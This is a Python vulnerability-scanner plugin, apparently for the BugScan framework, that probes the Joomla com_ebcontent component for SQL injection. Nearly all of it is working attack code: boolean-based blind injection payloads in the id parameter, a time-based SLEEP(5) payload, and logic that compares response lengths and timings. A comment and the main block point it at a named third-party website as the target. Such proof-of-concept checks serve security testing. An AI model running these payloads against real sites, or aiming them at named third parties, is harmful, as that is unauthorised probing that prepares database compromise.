#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:https://www.bugscan.net/#!/x/22902
#http://acquydongnai.net/index.php?option=com_ebcontent&view=article&tmpl=component&id=265%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn
import time
def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload0='/index.php?option=com_ebcontent&view=article&tmpl=component&id=37&cid=20&print=1&Itemid=14&lang=vn'
    payload1='/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
    payload2='/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7299%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
    payload3="/index.php?option=com_ebcontent&view=article&id=37%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))mbyz)%20AND%20%27dIwT%27=%27dIwT&cid=29&Itemid=129&lang=vn"
    url0 = arg+payload0
    url1 = arg+payload1
    url2 = arg+payload2
    url3 = arg+payload3
    first_start_time = time.time()
    code0, head0, body0,_,_  = curl.curl(url0)
    first_end_time = time.time()
    T1=first_end_time-first_start_time
    code1, head1, body1, _, _ = curl.curl(url1)
    code2, head2, body2, _, _ = curl.curl(url2)
    seconde_start_time = time.time()
    code3, head3, body3, _, _ = curl.curl(url3)
    seconde_end_time = time.time()
    T2=seconde_end_time-seconde_start_time
    if code0 == code1 == 200 and len(body0)==len(body1)!=len(body2):
        security_hole('Joomla com_ebcontent SQL injection boolean-based blind'+url1)
    elif 4.5<T2-T1:
        security_hole('Joomla com_ebcontent SQL injection Time-based blind'+url3)
                    
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla','http://acquydongnai.net/')[1])